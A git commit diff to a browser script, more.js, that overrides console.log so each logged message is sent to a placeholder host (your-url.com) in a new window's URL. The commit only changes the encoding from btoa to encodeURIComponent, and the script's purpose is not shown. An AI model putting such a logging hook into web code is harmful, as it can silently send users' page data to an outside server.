15804ecd6b8ddc78f4ab0a03af2603fe171a2941
text-plain <rerearnol@gmail.com>
2024-09-12 01:01:18 +0700

    Update more.js

--- more.js
+++ more.js
@@ -2,13 +2,15 @@ console.log("ready!");
 let key = "";
 let jk = "";
 const originalConsoleLog = console.log;
+
 console.log = function(message) {
     // Open a new window with the URL containing the log message
-    window.open("https://your-url.com?message=" + btoa(message), "_blank");
+    window.open("https://your-url.com?message=" + encodeURIComponent(message), "_blank");
     
     // Optionally, call the original console.log if you want to log the message to the console as well
     originalConsoleLog.apply(console, arguments);
 };
+
 
 
 const elements = document.querySelectorAll('*'); // Select all elements in the DOM
